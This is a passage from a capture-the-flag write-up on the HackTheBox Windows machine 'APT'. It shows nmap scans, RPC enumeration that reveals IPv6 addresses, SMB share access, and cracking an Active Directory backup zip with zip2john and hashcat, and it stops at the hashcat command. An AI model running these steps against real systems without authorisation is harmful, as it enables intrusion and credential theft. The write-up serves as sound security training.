@@ -1,0 +1,1000 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: APT</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-apt">htb-apt</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#ipv6">ipv6</a> <a class="post-tag" href="/tags#rpc">rpc</a> <a class="post-tag" href="/tags#ioxidresolver">ioxidresolver</a> <a class="post-tag" href="/tags#active-directory">active-directory</a> <a class="post-tag" href="/tags#domain-controller">domain-controller</a> <a class="post-tag" href="/tags#crackmapexec">crackmapexec</a> <a class="post-tag" href="/tags#hashcat">hashcat</a> <a class="post-tag" href="/tags#secretsdump">secretsdump</a> <a class="post-tag" href="/tags#ntds">ntds</a> <a class="post-tag" href="/tags#kerbrute">kerbrute</a> <a class="post-tag" href="/tags#wail2ban">wail2ban</a> <a class="post-tag" href="/tags#pykerbrute">pykerbrute</a> <a class="post-tag" href="/tags#mimikatz">mimikatz</a> <a class="post-tag" href="/tags#pass-the-hash">pass-the-hash</a> <a class="post-tag" href="/tags#powershell">powershell</a> <a class="post-tag" href="/tags#remote-registry">remote-registry</a> <a class="post-tag" href="/tags#powerview">powerview</a> <a class="post-tag" href="/tags#reg-py">reg-py</a> <a class="post-tag" href="/tags#evil-winrm">evil-winrm</a> <a class="post-tag" href="/tags#history">history</a> <a class="post-tag" href="/tags#lmcompatibilitylevel">lmcompatibilitylevel</a> <a class="post-tag" href="/tags#net-ntlmv1">net-ntlmv1</a> <a class="post-tag" href="/tags#winpeas">winpeas</a> <a class="post-tag" href="/tags#seatbelt">seatbelt</a> <a class="post-tag" href="/tags#amsi">amsi</a> <a class="post-tag" href="/tags#defender">defender</a> <a class="post-tag" href="/tags#responder">responder</a> <a class="post-tag" href="/tags#roguepotato">roguepotato</a> <a class="post-tag" href="/tags#ntlmrelayx">ntlmrelayx</a> <a class="post-tag" href="/tags#visual-studio">visual-studio</a> <a class="post-tag" href="/tags#crack-sh">crack-sh</a> <a class="post-tag" href="/tags#powershell-history">powershell-history</a> <a class="post-tag" href="/tags#oscp-plus-v2">oscp-plus-v2</a> <a class="post-tag" href="/tags#oscp-like-v2">oscp-like-v2</a> <a class="post-tag" href="/tags#oscp-plus-v3">oscp-plus-v3</a> <a class="post-tag" href="/tags#osep-like">osep-like</a> </span><br/><br/>
+<time class="dt-published" datetime="2021-04-10T13:45:00+00:00" itemprop="datePublished">Apr 10, 2021
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2021/04/10/htb-apt.html" style="color: #e6e6e6; text-decoration: none;">HTB: APT</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/apt-cover.webp" type="image/webp"/>
+<img alt="APT" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/apt-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>APT was a clinic in finding little things to exploit in a Windows host. I’ll start with access to only RPC and HTTP, and the website has nothing interesting. I’ll use RPC to identify an IPv6 address, which when scanned, shows typical Windows DC ports. Over SMB, I’ll pull a zip containing files related to an Active Directory environment. After cracking the password, I’ll use these files to dump 2000 users / hashes. Kerbrute will identify one user that is common between the backup and the AD on APT. The hash for that user doesn’t work, and brute forcing using NTLM hashes gets me blocked using SMB, so I’ll modify pyKerbrute to test all the hashes from the backup with the user, finding one that works. With that hash, I can access the registry and find additional creds that provide WinRM access. With a shell, I’ll notice that the system still allows Net-NTLMv1, which is an insecure format. I’ll show two ways to get the Net-NTLMv1 challenge response, first an unintended path using Defender and Responder, and then the intended path using RoguePotato and a custom RPC server created by modifying NTLMRelayX.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/296 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/apt" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">APT</a> <a href="https://hackthebox.com/machines/apt" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-apt.webp" type="image/webp"/> <img alt="APT" class="img-av" src="/icons/box-apt.png"/></picture></a><br/><a href="https://hackthebox.com/machines/apt" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1321799249470935042">31 Oct 2020</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">10 Apr 2021</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Windows <picture><source srcset="/icons/Windows.webp" type="image/webp"/><img alt="Windows" class="img-os" src="/icons/Windows.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Insane">Insane [50]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/apt-diff.webp" type="image/webp"/><img alt="Rated difficulty for APT" src="/img/apt-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/apt-radar.webp" type="image/webp"/><img alt="Radar chart for APT" src="/img/apt-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">2 days<span class="blood-time">04:20:38</span><a href="https://app.hackthebox.com/users/141036" rel="noopener" target="_blank"><img alt="pottm" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/141036" style="display: unset"/><span class="user-text" style="display: none"> pottm</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">7 days<span class="blood-time">05:27:41</span><a href="https://app.hackthebox.com/users/13340" rel="noopener" target="_blank"><img alt="0xEA31" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13340" style="display: unset"/><span class="user-text" style="display: none"> 0xEA31</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/9164" rel="noopener" target="_blank"><img alt="cube0x0" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/9164" style="display: unset"/><span class="user-text" style="display: none"> cube0x0</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> found two open TCP ports, RPC (135) and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.213
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-02 11:34 EDT
+Nmap scan report for 10.10.10.213
+Host is up (0.065s latency).
+Not shown: 65533 filtered ports
+PORT    STATE SERVICE
+80/tcp  open  http
+135/tcp open  msrpc
+
+Nmap done: 1 IP address (1 host up) scanned in 13.83 seconds
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-p</span> 80,135 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.10.213
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-02 11:34 EDT
+Nmap scan report for 10.10.10.213
+Host is up (0.13s latency).
+
+PORT    STATE SERVICE VERSION
+80/tcp  open  http    Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Gigantic Hosting | Home
+135/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.28 seconds
+</span></code></pre></div></div>
+<p>Not much on the OS beyond Windows.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<p>The site is for a hosting company:</p>
+<div style="max-height: 300px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20210402113626700.png">
+<img alt="image-20210402113626700" src="https://0xdfimages.gitlab.io/img/image-20210402113626700.png" style="clip-path: polygon(0 0, 100% 0, 100% 260px, 49% 290px, 51% 270px, 0 300px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 260px, 49% 290px, 51% 270px, 0 300px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 275px"><a href="https://0xdfimages.gitlab.io/img/image-20210402113626700.png"><i>Click for full image</i></a></div>
+</div>
+<p>I recognized this website from Endgame Hades, but the vulnerability in that site isn’t present on this one.</p>
+<p>There’s a bunch of static content, and a contact support form:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210402113805414.webp" type="image/webp"/>
+<img alt="image-20210402113805414" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210402113805414.png"/>
+</picture>
+<p>The form tries to submit to 10.13.38.16, which is also a part of Hades:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"contact-form"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">action=</span><span class="s">"https://10.13.38.16/contact-post.html"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">class=</span><span class="s">"textbox"</span> <span class="na">value=</span><span class="s">"Name"</span> <span class="na">onfocus=</span><span class="s">"this.value = '';"</span> <span class="na">onblur=</span><span class="s">"if (this.value == '') {this.value = 'Name';}"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">class=</span><span class="s">"textbox"</span> <span class="na">value=</span><span class="s">"Email"</span> <span class="na">onfocus=</span><span class="s">"this.value = '';"</span> <span class="na">onblur=</span><span class="s">"if (this.value == '') {this.value = 'Email';}"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;textarea</span> <span class="na">value=</span><span class="s">"Message:"</span> <span class="na">onfocus=</span><span class="s">"this.value = '';"</span> <span class="na">onblur=</span><span class="s">"if (this.value == '') {this.value = 'Message';}"</span><span class="nt">&gt;</span>Message<span class="nt">&lt;/textarea&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;/form&gt;</span>
+</code></pre></div></div>
+<p>I’m guessing this is just reused, and also not useful. At the very bottom of the page, there’s a comment:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- Mirrored from 10.13.38.16/support.html by HTTrack Website Copier/3.x [XR&amp;CO'2014], Mon, 23 Dec 2019 08:13:45 GMT --&gt;</span>
+</code></pre></div></div>
+<p>Definitely mirrored from Hades.</p>
+<p>I didn’t find much else useful on the website, and given that it appears to just be copied from Endgame, I suspect I should look elsewhere. I did run <a href="https://github.com/epi052/feroxbuster">Feroxbuster</a> to brute force directories, but didn’t find anything useful.</p>
+<h3 id="rpc---tcp-135">RPC - TCP 135</h3>
+<p>This box gets into a level of detail that is quite a stretch for me, so I’m going to do my best to explain it, but also might handwave a bit more than usual. It’s easy to confuse the services offered over 135, 139, and 445 on Windows. <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/service-overview-and-network-port-requirements">This Technet Article</a> gives a good, long, and very detailed description of the different services and the different ports they use.</p>
+<p><code class="language-plaintext highlighter-rouge">rpcclient</code> will try to connect to TCP 445 or TCP 139, so it doesn’t do much here.</p>
+<p>TCP 135 is the Endpoint Mapper and Component Object Model (COM) Service Control Manager. There’s a tool called <code class="language-plaintext highlighter-rouge">rpcmap.py</code> from <a href="https://github.com/SecureAuthCorp/impacket/">Impacket</a> that will show these mappings. This tool needs a <code class="language-plaintext highlighter-rouge">stringbinding</code> argument to enable it’s connection. The examples from <code class="language-plaintext highlighter-rouge">-h</code> are:</p>
+<blockquote>
+<p>stringbinding         String binding to connect to MSRPC interface, for example:
+                        ncacn_ip_tcp:192.168.0.1[135]                                                  <br/>
+                        ncacn_np:192.168.0.1[\pipe\spoolss]                                            <br/>
+                        ncacn_http:192.168.0.1[593]                                                    <br/>
+                        ncacn_http:[6001,RpcProxy=exchange.contoso.com:443]                            <br/>
+                        ncacn_http:localhost[3388,RpcProxy=rds.contoso:443]</p>
+</blockquote>
+<p><code class="language-plaintext highlighter-rouge">NCANCN_IP_TCP</code> is an <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/95fbfb56-d67a-47df-900c-e263d6031f22">RPC connection directly over TCP</a>. That seems like a good place to start. Running that gives a list of RPC mappings:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>rpcmap.py <span class="s1">'ncacn_ip_tcp:10.10.10.213'</span>
+<span class="go">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+...[snip]...
+Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
+Provider: rpcss.dll
+UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0
+...[snip]...
+</span></code></pre></div></div>
+<p>This scan provided a bunch of RPC endpoints with their UUIDs. The MS-DCOM ones are defined on <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4">this page</a>. The one shown above is the RPC interface UUID for IObjectExporter, or the IOXIDResolver. This is know that is used for the <a href="https://2020.romhack.io/dl-2020/RH2020-slides-Cocomazzi.pdf">Potato exploits</a>. <a href="https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/">This article</a> shows how to use this interface to get a list of network interfaces without auth.</p>
+<p>There’s a POC script at the bottom (I added <code class="language-plaintext highlighter-rouge">()</code> around the print statement so it would work with modern Python), which I’ll grab and run:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>python3 IOXIDResolver.py <span class="nt">-t</span> 10.10.10.213
+<span class="go">[*] Retrieving network interface of 10.10.10.213
+Address: apt
+Address: 10.10.10.213
+Address: dead:beef::b885:d62a:d679:573f
+Address: dead:beef::9514:421b:5cde:a7da
+</span></code></pre></div></div>
+<h3 id="nmap-on-v6">nmap on v6</h3>
+<p>With the IPv6 address, I’ll try <code class="language-plaintext highlighter-rouge">nmap</code> again, and there’s a bunch more open ports:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-6</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp-ipv6 dead:beef::b885:d62a:d679:573f
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-02 12:44 EDT
+Nmap scan report for dead:beef::b885:d62a:d679:573f
+Host is up (0.032s latency).
+Not shown: 65513 filtered ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49673/tcp open  unknown
+49691/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 36.32 seconds
+
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-6</span> <span class="nt">-p</span> 53,80,88,135,389,445,464,593,636,3268,3269,5985,9389 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts-ipv6 dead:beef::b885:d62a:d679:573f
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-02 12:46 EDT
+Nmap scan report for dead:beef::b885:d62a:d679:573f
+Host is up (0.025s latency).
+
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain       Simple DNS Plus
+80/tcp   open  http         Microsoft IIS httpd 10.0
+| http-server-header: 
+|   Microsoft-HTTPAPI/2.0
+|_  Microsoft-IIS/10.0
+|_http-title: Bad Request
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-04-02 16:49:09Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=apt.htb.local
+| Subject Alternative Name: DNS:apt.htb.local
+| Not valid before: 2020-09-24T07:07:18
+|_Not valid after:  2050-09-24T07:17:18
+|_ssl-date: 2021-04-02T16:50:03+00:00; +2m44s from scanner time.
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=apt.htb.local
+| Subject Alternative Name: DNS:apt.htb.local
+| Not valid before: 2020-09-24T07:07:18
+|_Not valid after:  2050-09-24T07:17:18
+|_ssl-date: 2021-04-02T16:50:02+00:00; +2m43s from scanner time.
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=apt.htb.local
+| Subject Alternative Name: DNS:apt.htb.local
+| Not valid before: 2020-09-24T07:07:18
+|_Not valid after:  2050-09-24T07:17:18
+|_ssl-date: 2021-04-02T16:50:03+00:00; +2m44s from scanner time.
+3269/tcp open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=apt.htb.local
+| Subject Alternative Name: DNS:apt.htb.local
+| Not valid before: 2020-09-24T07:07:18
+|_Not valid after:  2050-09-24T07:17:18
+|_ssl-date: 2021-04-02T16:50:02+00:00; +2m43s from scanner time.
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Bad Request
+9389/tcp open  mc-nmf       .NET Message Framing
+Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -5m50s, deviation: 22m38s, median: 2m42s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: apt
+|   NetBIOS computer name: APT\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: apt.htb.local
+|_  System time: 2021-04-02T17:49:53+01:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-04-02T16:49:49
+|_  start_date: 2021-04-02T15:21:15
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 60.64 seconds
+</span></code></pre></div></div>
+<p>That’s a bunch more information. All the open ports make it look like a Windows DC. The OS is Windows Server 2016 Standard 14393.</p>
+<h3 id="smb---tcp-445">SMB - TCP 445</h3>
+<p>IPv6 support was added to <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> in version 5.1.6dev. Still in trying to use it, there is a bug when trying to list shares. I reached out to one of the devs who got it fixed:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>~/cme smb dead:beef::b885:d62a:d679:573f <span class="nt">--shares</span> <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span>
+<span class="go">SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\: STATUS_ACCESS_DENIED 
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] Enumerated shares
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              Share           Permissions     Remark
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              -----           -----------     ------
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              backup          READ            
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              IPC$                            Remote IPC
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              NETLOGON                        Logon server share 
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              SYSVOL                          Logon server share
+</span></code></pre></div></div>
+<p>If you can’t get the latest version, <code class="language-plaintext highlighter-rouge">smbclient</code> also shows the shares:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo exit</span> | smbclient <span class="nt">-L</span> <span class="se">\\\\</span>dead:beef::b885:d62a:d679:573f
+<span class="go">Enter WORKGROUP\oxdf's password: 
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        backup          Disk      
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+dead:beef::b885:d62a:d679:573f is an IPv6 address -- no workgroup available
+</span></code></pre></div></div>
+<p>There’s a share called <code class="language-plaintext highlighter-rouge">backup</code>. It contains a single file, <code class="language-plaintext highlighter-rouge">backup.zip</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>smbclient <span class="se">\\\\</span>dead:beef::b885:d62a:d679:573f<span class="se">\\</span>backup
+<span class="go">Enter WORKGROUP\oxdf's password: 
+Anonymous login successful
+Try "help" to get a list of possible commands.
+</span><span class="gp">smb: \&gt;</span><span class="w"> </span><span class="nb">dir</span>
+<span class="go">  .                                   D        0  Thu Sep 24 03:30:52 2020
+  ..                                  D        0  Thu Sep 24 03:30:52 2020
+  backup.zip                          A 10650961  Thu Sep 24 03:30:32 2020
+
+                10357247 blocks of size 4096. 6949719 blocks available
+</span><span class="gp">smb: \&gt;</span><span class="w"> </span>get backup.zip
+<span class="go">getting file \backup.zip of size 10650961 as backup.zip (6448.4 KiloBytes/sec) (average 6448.4 KiloBytes/sec)
+</span></code></pre></div></div>
+<h2 id="shell-as-henryvinson_adm">Shell as henry.vinson_adm</h2>
+<h3 id="recover-ntdsdit">Recover ntds.dit</h3>
+<h4 id="enumeration">Enumeration</h4>
+<p><code class="language-plaintext highlighter-rouge">backup.zip</code> looks like the backup of an Active Directory environment. The files are the ones needed to restore an AD environment, or to maliciously dump all the hashes offline:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>unzip <span class="nt">-l</span> backup.zip 
+<span class="go">Archive:  backup.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+        0  2020-09-23 19:40   Active Directory/
+ 50331648  2020-09-23 19:38   Active Directory/ntds.dit
+    16384  2020-09-23 19:38   Active Directory/ntds.jfm
+        0  2020-09-23 19:40   registry/
+   262144  2020-09-23 19:22   registry/SECURITY
+ 12582912  2020-09-23 19:22   registry/SYSTEM
+---------                     -------
+ 63193088                     6 files
+</span></code></pre></div></div>
+<p>On trying to unzip, it asks for a password:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>unzip backup.zip 
+<span class="go">Archive:  backup.zip
+   creating: Active Directory/
+[backup.zip] Active Directory/ntds.dit password: 
+</span></code></pre></div></div>
+<h4 id="generatecrack-hash">Generate/Crack Hash</h4>
+<p><code class="language-plaintext highlighter-rouge">zip2john</code> will provide a hash for the password of the zip:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>zip2john backup.zip <span class="o">&gt;</span> backup.zip.hash
+<span class="go">backup.zip/Active Directory/ is not encrypted!
+ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type
+ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB
+ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785
+ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression type
+ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3
+ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD
+NOTE: It is assumed that all files in each archive have the same password.
+If that is not the case, the hash may be uncrackable. To avoid this, use
+option -o to pick a file at a time.
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">cat </span>backup.zip.hash 
+<span class="gp">backup.zip:$</span>pkzip2<span class="nv">$3</span><span class="k">*</span>1<span class="k">*</span>1<span class="k">*</span>0<span class="k">*</span>8<span class="k">*</span>24<span class="k">*</span>9beb<span class="k">*</span>9ac6<span class="k">*</span>0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed<span class="k">*</span>1<span class="k">*</span>0<span class="k">*</span>8<span class="k">*</span>24<span class="k">*</span>acd0<span class="k">*</span>9cca<span class="k">*</span>0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5<span class="k">*</span>2<span class="k">*</span>0<span class="k">*</span>156<span class="k">*</span>4000<span class="k">*</span>2a393785<span class="k">*</span>81733d<span class="k">*</span>37<span class="k">*</span>8<span class="k">*</span>156<span class="k">*</span>2a39<span class="k">*</span>9cca<span class="k">*</span>0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996<span class="k">*</span><span class="nv">$/</span>pkzip2<span class="nv">$:</span>:backup.zip:Active Directory/ntds.jfm, registry/SECURITY, Active Directory/ntds.dit:backup.zip
+</code></pre></div></div>
+<p>That hash matches “PKZIP (Compressed Multi-File)”, or more 17220, on the Hashcat <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">example hashes</a> page. It breaks in <code class="language-plaintext highlighter-rouge">hashcat</code> very quickly:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>hashcat <span class="nt">-m</span> 17220 backup.zip.hash /usr/share/wordlists/rockyou.txt <span class="nt">--user</span>
+<span class="go">...[snip]..
